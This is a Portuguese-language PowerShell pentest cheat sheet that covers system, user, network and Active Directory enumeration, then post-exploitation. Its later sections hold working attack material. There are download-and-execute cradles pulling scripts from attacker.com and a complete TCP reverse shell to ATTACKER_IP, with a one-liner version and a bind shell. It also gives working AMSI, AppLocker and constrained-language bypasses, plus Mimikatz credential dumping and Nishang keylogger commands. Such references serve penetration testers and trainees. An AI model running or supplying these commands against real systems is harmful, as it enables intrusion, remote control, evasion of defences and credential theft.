# 💻 PowerShell — guia de referência completo para pentest

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝██║     ██║     
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝███████╗███████║█████╗  ██║     ██║     
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚════██║██╔══██║██╔══╝  ██║     ██║     
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║███████║██║  ██║███████╗███████╗███████╗
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerShell-blue?style=for-the-badge&logo=powershell" alt="PowerShell">
  <img src="https://img.shields.io/badge/Windows-Hacking-red?style=for-the-badge" alt="Hacking">
  <img src="https://img.shields.io/badge/Post_Exploitation-orange?style=for-the-badge" alt="Post-Exploitation">
</p>

> **Termos usados:** pentest significa teste de intrusão; exploit é código que explora uma vulnerabilidade; payload é a carga executada; listener é um processo à escuta. Pós-exploração refere-se às ações após o acesso inicial. Mantêm-se os nomes técnicos e os literais dos exemplos; a disponibilidade de módulos e opções depende da versão e da plataforma.

> **Compatibilidade:** muitos exemplos destinam-se a Windows PowerShell 5.1. `Get-WmiObject` e `Get-EventLog` não estão disponíveis da mesma forma em PowerShell 7; consultar as [diferenças oficiais entre versões](https://learn.microsoft.com/en-us/powershell/scripting/whats-new/differences-from-windows-powershell). `dir /a:h`, `dir /r`, `more <` e `sc query` incluem sintaxe ou nomes associados a cmd.exe e não são universalmente equivalentes no PowerShell. Os cmdlets AD/GPO requerem os módulos correspondentes.

> **Política e exemplos incompletos:** a política de execução [não é uma fronteira de segurança](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies). `-Scope Process` aplica-se à sessão; `-Scope CurrentUser` tem outro alcance. O bloco de alteração de memória AMSI contém apenas declarações e um marcador de código em falta; não implementa o contorno completo. Não se deve presumir a presença de PowerShell 2.0 nem o êxito dos exemplos de evasão.

---

## 📋 Índice

- [Fundamentos](#-basics)
- [Enumeração do sistema](#-system-enumeration)
- [Enumeração de utilizadores](#-user-enumeration)
- [Comandos de rede](#-network-commands)
- [Operações com ficheiros](#-file-operations)
- [Gestão de processos e serviços](#-process--service-management)
- [Operações no registo](#-registry-operations)
- [Active Directory](#-active-directory)
- [Descarga e execução](#-download--execution)
- [Reverse shells (ligações de shell iniciadas pelo alvo)](#-reverse-shells)
- [Técnicas de contorno](#-bypass-techniques)
- [Ferramentas ofensivas](#-offensive-tools)
- [Comandos de uma linha](#-one-liners)

---

<a id="-basics"></a>
## 🔰 Fundamentos

### Política de execução

```powershell
# Verificar a política atual
Get-ExecutionPolicy
Get-ExecutionPolicy -List

# Contornar a política de execução (sessão atual)
Set-ExecutionPolicy Bypass -Scope Process
Set-ExecutionPolicy Unrestricted -Scope CurrentUser

# Executar um script contornando a política
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -File script.ps1
```

### Obter ajuda

```powershell
# Obter ajuda para um comando
Get-Help Get-Process
Get-Help Get-Process -Full
Get-Help Get-Process -Examples

# Atualizar a ajuda
Update-Help

# Listar todos os comandos
Get-Command
Get-Command -Module ActiveDirectory
Get-Command *process*
```

### Variáveis e operadores

```powershell
# Variáveis
$var = "value"
$number = 42
$array = @(1, 2, 3)
$hash = @{key="value"; name="test"}

# Variáveis de ambiente
$env:USERNAME
$env:COMPUTERNAME
$env:USERDOMAIN
$env:PATH
Get-ChildItem Env:

# Operadores de comparação
-eq   # Igual
-ne   # Diferente
-gt   # Maior que
-lt   # Menor que
-like # Correspondência com wildcards
-match # Correspondência com expressão regular
```

### Pipelines e filtragem

```powershell
# Encaminhar a saída pelo pipeline
Get-Process | Where-Object {$_.CPU -gt 10}
Get-Service | Where-Object Status -eq "Running"

# Selecionar propriedades
Get-Process | Select-Object Name, CPU, Id
Get-Process | Select-Object -First 5

# Ordenar
Get-Process | Sort-Object CPU -Descending

# Formatar a saída
Get-Process | Format-Table -AutoSize
Get-Process | Format-List *
Get-Process | Out-GridView
```

---

<a id="-system-enumeration"></a>
## 🔍 Enumeração do sistema

### Informações do sistema

```powershell
# Informações do computador
Get-ComputerInfo
systeminfo
hostname
$env:COMPUTERNAME

# Versão do sistema operativo
[System.Environment]::OSVersion
(Get-WmiObject Win32_OperatingSystem).Caption
(Get-CimInstance Win32_OperatingSystem).Version

# Arquitetura
[Environment]::Is64BitOperatingSystem
$env:PROCESSOR_ARCHITECTURE

# Correções/atualizações
Get-HotFix
Get-HotFix | Where-Object InstalledOn -gt (Get-Date).AddDays(-30)
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Software instalado

```powershell
# Software de 64 bits
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# Software de 32 bits num sistema operativo de 64 bits
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# Utilizar WMI
Get-WmiObject -Class Win32_Product | Select-Object Name, Version

# Listagem rápida
Get-Package
```

### Antivírus e segurança

```powershell
# Obter o antivírus
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
Get-MpComputerStatus  # Windows Defender

# Estado da firewall
Get-NetFirewallProfile
netsh advfirewall show allprofiles

# Regras da firewall
Get-NetFirewallRule | Where-Object Enabled -eq True
Get-NetFirewallRule -DisplayName "*Remote*"

# Exclusões do Windows Defender
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
```

### Tarefas agendadas

```powershell
# Listar tarefas agendadas
Get-ScheduledTask
Get-ScheduledTask | Where-Object State -eq "Ready"

# Detalhes da tarefa
Get-ScheduledTask -TaskName "TaskName" | Get-ScheduledTaskInfo

# schtasks
schtasks /query /fo LIST /v
```

---

<a id="-user-enumeration"></a>
## 👤 Enumeração de utilizadores

### Utilizadores locais

```powershell
# Utilizador atual
whoami
$env:USERNAME
[Environment]::UserName
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Todos os utilizadores locais
Get-LocalUser
Get-LocalUser | Select-Object Name, Enabled, LastLogon
net user

# Detalhes do utilizador
Get-LocalUser Administrator
net user Administrator

# Grupos do utilizador
Get-LocalGroupMember Administrators
net localgroup Administrators
```

### Privilégios do utilizador

```powershell
# Privilégios atuais
whoami /priv
whoami /all
whoami /groups

# Verificar se é administrador
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

### Grupos

```powershell
# Listar grupos locais
Get-LocalGroup
net localgroup

# Membros do grupo
Get-LocalGroupMember "Administrators"
Get-LocalGroupMember "Remote Desktop Users"
net localgroup "Administrators"
```

### Utilizadores com sessão iniciada

```powershell
# Com sessão iniciada atualmente
query user
quser
qwinsta

# Inícios de sessão recentes
Get-WmiObject Win32_LogonSession | Select-Object LogonId, LogonType, StartTime
Get-EventLog -LogName Security -InstanceId 4624 -Newest 10
```

---

<a id="-network-commands"></a>
## 🌐 Comandos de rede

### Configuração de rede

```powershell
# Configuração IP
Get-NetIPConfiguration
Get-NetIPAddress
ipconfig /all

# DNS
Get-DnsClientServerAddress
ipconfig /displaydns

# Rotas
Get-NetRoute
route print

# Tabela ARP
Get-NetNeighbor
arp -a
```

### Portas abertas e ligações

```powershell
# Ligações TCP
Get-NetTCPConnection
Get-NetTCPConnection -State Listen
Get-NetTCPConnection | Where-Object State -eq "Established"
netstat -ano

# Endpoints UDP
Get-NetUDPEndpoint

# Procurar o processo associado a uma porta
Get-NetTCPConnection -LocalPort 80 | Select-Object OwningProcess
Get-Process -Id (Get-NetTCPConnection -LocalPort 80).OwningProcess
```

### Testes de rede

```powershell
# Ping
Test-Connection google.com
Test-Connection -ComputerName 192.168.1.1 -Count 4

# Verificar uma porta
Test-NetConnection -ComputerName 192.168.1.1 -Port 445
Test-NetConnection -ComputerName google.com -Port 443

# Rastrear a rota
Test-NetConnection -ComputerName google.com -TraceRoute

# Consulta DNS
Resolve-DnsName google.com
nslookup google.com
```

### Partilhas de rede

```powershell
# Listar partilhas
Get-SmbShare
net share

# Mapear uma unidade de rede
New-PSDrive -Name Z -PSProvider FileSystem -Root "\\server\share"
net use Z: \\server\share

# Listar partilhas ligadas
Get-SmbConnection
net use

# Aceder à partilha
Get-ChildItem \\server\share
dir \\192.168.1.1\c$
```

---

<a id="-file-operations"></a>
## 📁 Operações com ficheiros

### Navegação e listagem

```powershell
# Pasta atual
Get-Location
pwd

# Mudar de pasta
Set-Location C:\Users
cd C:\Users

# Listar ficheiros
Get-ChildItem
Get-ChildItem -Force  # Incluir ficheiros ocultos
Get-ChildItem -Recurse
ls
dir

# Listar ficheiros ocultos
Get-ChildItem -Hidden
Get-ChildItem -Attributes Hidden
dir /a:h
```

### Pesquisa de ficheiros

```powershell
# Procurar ficheiros pelo nome
Get-ChildItem -Path C:\ -Recurse -Name "*.txt" -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Recurse -Filter "password*" -ErrorAction SilentlyContinue

# Procurar ficheiros que contenham texto
Get-ChildItem -Recurse | Select-String "password"
Select-String -Path "C:\*.txt" -Pattern "password"

# Procurar ficheiros grandes
Get-ChildItem -Recurse | Where-Object Length -gt 100MB

# Procurar ficheiros modificados recentemente
Get-ChildItem -Recurse | Where-Object LastWriteTime -gt (Get-Date).AddDays(-7)
```

### Ler e escrever ficheiros

```powershell
# Ler ficheiro
Get-Content file.txt
Get-Content file.txt -Head 10
Get-Content file.txt -Tail 10
type file.txt
cat file.txt

# Escrever num ficheiro
Set-Content file.txt "content"
Add-Content file.txt "append"
"content" | Out-File file.txt
"content" >> file.txt  # Acrescentar

# Copiar/mover/eliminar
Copy-Item source.txt destination.txt
Move-Item source.txt destination.txt
Remove-Item file.txt
Remove-Item folder -Recurse -Force
```

### Alternate Data Streams (ADS: fluxos de dados alternativos)

```powershell
# Listar ADS
Get-Item file.txt -Stream *
dir /r file.txt

# Ler ADS
Get-Content file.txt -Stream secret
more < file.txt:secret

# Escrever em ADS
Set-Content file.txt -Stream hidden "secret data"
echo "data" > file.txt:hidden

# Remover ADS
Remove-Item file.txt -Stream hidden
```

### Cálculo de hashes

```powershell
# Obter o hash do ficheiro
Get-FileHash file.txt
Get-FileHash file.txt -Algorithm MD5
Get-FileHash file.txt -Algorithm SHA256
Get-FileHash file.txt -Algorithm SHA512

# Verificar o hash
(Get-FileHash file.txt).Hash -eq "expected_hash"
```

---

<a id="-process--service-management"></a>
## ⚙️ Gestão de processos e serviços

### Processos

```powershell
# Listar processos
Get-Process
Get-Process | Sort-Object CPU -Descending
Get-Process -Name "chrome"
tasklist

# Detalhes do processo
Get-Process -Id 1234 | Format-List *
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine

# Iniciar um processo
Start-Process notepad.exe
Start-Process -FilePath "cmd.exe" -ArgumentList "/c whoami"
Start-Process -FilePath "powershell.exe" -Verb RunAs  # Como administrador

# Parar um processo
Stop-Process -Name "notepad"
Stop-Process -Id 1234 -Force
taskkill /PID 1234 /F
```

### Serviços

```powershell
# Listar serviços
Get-Service
Get-Service | Where-Object Status -eq "Running"
Get-Service | Where-Object StartType -eq "Automatic"
sc query

# Detalhes do serviço
Get-Service -Name "WinRM" | Format-List *
Get-WmiObject Win32_Service | Select-Object Name, StartMode, PathName

# Iniciar/parar serviços
Start-Service -Name "WinRM"
Stop-Service -Name "WinRM"
Restart-Service -Name "WinRM"
net start WinRM
net stop WinRM

# Caminho do serviço (para verificar caminhos sem aspas)
Get-WmiObject Win32_Service | Select-Object Name, PathName | Where-Object {$_.PathName -notlike '"*'}
```

---

<a id="-registry-operations"></a>
## 📝 Operações no registo

### Ler o registo

```powershell
# Listar chaves do registo
Get-ChildItem HKLM:\SOFTWARE
Get-ChildItem HKCU:\SOFTWARE

# Obter o valor do registo
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemPropertyValue HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "SecurityHealth"

# Pesquisar no registo
Get-ChildItem HKLM:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "password"}
```

### Escrever no registo

```powershell
# Criar uma chave
New-Item -Path HKCU:\SOFTWARE\MyKey

# Definir um valor
Set-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value" -Value "Data"
New-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "NewValue" -Value "Data" -PropertyType String

# Eliminar
Remove-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value"
Remove-Item -Path HKCU:\SOFTWARE\MyKey -Recurse
```

### Localizações importantes do registo

```powershell
# Localizações de arranque automático
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Uninstall (software instalado)
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*

# SAM (requer SYSTEM)
# HKLM:\SAM\SAM

# Segredos LSA
# HKLM:\SECURITY\Policy\Secrets
```

---

<a id="-active-directory"></a>
## 🏢 Active Directory

### Informações do domínio

```powershell
# Informações do domínio
Get-ADDomain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$env:USERDNSDOMAIN

# Controladores de domínio
Get-ADDomainController
Get-ADDomainController -Filter * | Select-Object Name, IPv4Address

# Informações da floresta
Get-ADForest

# Relações de confiança
Get-ADTrust -Filter *
```

### Enumeração de utilizadores (AD)

```powershell
# Todos os utilizadores do domínio
Get-ADUser -Filter *
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled

# Utilizador específico
Get-ADUser -Identity administrator -Properties *

# Utilizadores com uma propriedade específica
Get-ADUser -Filter {AdminCount -eq 1}  # Administradores
Get-ADUser -Filter {ServicePrincipalName -ne "$null"}  # Suscetíveis a Kerberoasting

# Procurar utilizadores
Get-ADUser -Filter {Name -like "*admin*"}
Get-ADUser -Filter {Description -like "*password*"}
```

### Enumeração de grupos (AD)

```powershell
# Todos os grupos
Get-ADGroup -Filter *

# Administradores do domínio
Get-ADGroupMember "Domain Admins"
Get-ADGroupMember "Domain Admins" -Recursive

# Administradores da empresa
Get-ADGroupMember "Enterprise Admins"

# Grupos do utilizador
Get-ADPrincipalGroupMembership username
```

### Enumeração de computadores (AD)

```powershell
# Todos os computadores
Get-ADComputer -Filter *
Get-ADComputer -Filter * -Properties *

# Controladores de domínio
Get-ADComputer -Filter {PrimaryGroupId -eq 516}

# Servidores
Get-ADComputer -Filter {OperatingSystem -like "*Server*"}
```

### Informações de GPOs

```powershell
# Listar GPOs
Get-GPO -All
Get-GPO -All | Select-Object DisplayName, GpoStatus

# Detalhes da GPO
Get-GPO -Name "Default Domain Policy"

# Relatório da GPO
Get-GPOReport -Name "Default Domain Policy" -ReportType HTML -Path report.html
```

---

<a id="-download--execution"></a>
## ⬇️ Descarga e execução

### Descarregar ficheiros

```powershell
# Invoke-WebRequest (equivalente a wget/curl)
Invoke-WebRequest -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
iwr -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
wget "http://attacker.com/file.exe" -OutFile "file.exe"

# WebClient (mais rápido)
(New-Object Net.WebClient).DownloadFile("http://attacker.com/file.exe", "C:\file.exe")

# Descarregar uma cadeia de caracteres (para scripts)
(New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")

# Invoke-RestMethod
Invoke-RestMethod -Uri "http://attacker.com/file.exe" -OutFile "file.exe"

# Transferência BITS (mais discreta)
Start-BitsTransfer -Source "http://attacker.com/file.exe" -Destination "file.exe"

# certutil (LOLBin)
certutil -urlcache -split -f "http://attacker.com/file.exe" file.exe
```

### Descarregar e executar (em memória)

```powershell
# IEX — Invoke-Expression (sem ficheiro no disco)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX (iwr 'http://attacker.com/script.ps1')

# Com uma variável
$script = (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX $script

# Invoke-Comando
Invoke-Command -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')}
```

### Execução de código codificado

```powershell
# Codificar o comando em Base64
$command = "whoami"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
echo $encoded

# Executar o comando codificado
powershell -enc <base64_string>
powershell -EncodedCommand <base64_string>

# Codificador numa única linha
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"))
```

---

<a id="-reverse-shells"></a>
## 🔌 Reverse shells (ligações de shell iniciadas pelo alvo)

### Reverse shell PowerShell

```powershell
# Reverse shell TCP
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

### Reverse shell numa única linha

```powershell
# Nishang
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444

# PowerCat
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/powercat.ps1')
powercat -c ATTACKER_IP -p 4444 -e cmd

# Powerline
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Bind shell (shell à escuta no alvo)

```powershell
# Ficar à escuta numa porta
$listener = [System.Net.Sockets.TcpListener]4444
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
$listener.Stop()
```

---

<a id="-bypass-techniques"></a>
## 🛡️ Técnicas de contorno

### Contorno da política de execução

```powershell
# Métodos de contorno
powershell -ep bypass
powershell -ExecutionPolicy Bypass
Set-ExecutionPolicy Bypass -Scope Process

# Ler e encaminhar pelo pipeline
Get-Content script.ps1 | PowerShell -NoProfile -
type script.ps1 | PowerShell -NoProfile -

# Descarregar uma cadeia de caracteres (sem ficheiro no disco)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
```

### Contornar a AMSI

```powershell
# Contorno simples da AMSI (pode ser detetado)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Ofuscado
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Alteração de memória (requer administrador)
$win32 = @"
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $win32
# ... (código completo de contorno)
```

### Contorno do modo de linguagem restrita

```powershell
# Verificar o modo de linguagem
$ExecutionContext.SessionState.LanguageMode

# Se estiver em ConstrainedLanguage, experimentar:
# - PowerShell 2.0 (se disponível)
powershell -version 2

# - InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

### Contorno do AppLocker

```powershell
# MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

# InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload.exe

# Regasm/Regsvcs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# Verificar as regras do AppLocker
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

---

<a id="-offensive-tools"></a>
## 🔫 Ferramentas ofensivas

### PowerSploit

```powershell
# Descarregar
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerSploit/Recon/PowerView.ps1')

# PowerView (enumeração de AD)
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
Find-LocalAdminAccess
Invoke-UserHunter

# PowerUp (escalada de privilégios)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1')
Invoke-AllChecks

# Invoke-Mimikatz
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

### Empire/PowerShell Empire

```powershell
# Execução do stager (a partir do Empire)
powershell -noP -sta -w 1 -enc <base64_payload>
```

### Nishang

```powershell
# Reverse shell
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Shells/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444

# Registo de teclas
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Keylogger.ps1')
Keylogger

# Get-PassHashes
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Get-PassHashes.ps1')
Get-PassHashes
```

---

<a id="-one-liners"></a>
## ⚡ Comandos de uma linha

### Enumeração numa única linha

```powershell
# Informações do sistema
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Utilizadores
Get-LocalUser | Select Name,Enabled

# Software instalado
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName

# Portas abertas
Get-NetTCPConnection -State Listen | Select LocalAddress,LocalPort,OwningProcess

# Serviços em execução
Get-Service | Where Status -eq Running | Select Name,DisplayName

# Tarefas agendadas
schtasks /query /fo TABLE | findstr /v "TaskName"

# Estado do antivírus
Get-MpComputerStatus | Select RealTimeProtectionEnabled,IoavProtectionEnabled

# Firewall
Get-NetFirewallProfile | Select Name,Enabled
```

### Descargas numa única linha

```powershell
# Descarga com PowerShell
(New-Object Net.WebClient).DownloadFile("http://url/file","C:\file")
IEX (New-Object Net.WebClient).DownloadString("http://url/script.ps1")
Invoke-WebRequest -Uri "http://url/file" -OutFile "file"

# certutil
certutil -urlcache -split -f "http://url/file" file

# bitsadmin
bitsadmin /transfer job /download /priority high http://url/file C:\file
```

### Tabela de comandos

| Finalidade | Comando |
|---------|---------|
| Utilizador atual | `whoami` |
| Todos os utilizadores | `Get-LocalUser` |
| Administradores | `Get-LocalGroupMember Administrators` |
| Informações do sistema | `systeminfo` |
| Configuração IP | `Get-NetIPAddress` |
| Portas abertas | `Get-NetTCPConnection -State Listen` |
| Processos | `Get-Process` |
| Serviços | `Get-Service \| Where Status -eq Running` |
| Procurar ficheiros | `Get-ChildItem -Recurse -Filter "*.txt"` |
| Pesquisar conteúdo | `Select-String -Path "C:\*" -Pattern "password"` |
| Descarregar ficheiro | `(New-Object Net.WebClient).DownloadFile("url","file")` |
| Execução codificada | `powershell -enc <base64>` |

---

## 📚 Recursos

- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [Nishang](https://github.com/samratashok/nishang)
- [PowerShell Empire](https://github.com/EmpireProject/Empire)
- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks PowerShell](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)

### Guias de referência relacionados
- [Mimikatz](../../Mimikatz/translations/README.pt.md)
- [Windows PrivEsc](../../Windows-PrivEsc/README.md)
- [Metasploit](../../Metasploit/translations/README.pt.md)

---

<p align="center">
  <b>💻 Domina o PowerShell para testes de intrusão!</b><br>
  <i>A linguagem de scripts mais poderosa do Windows</i>
</p>
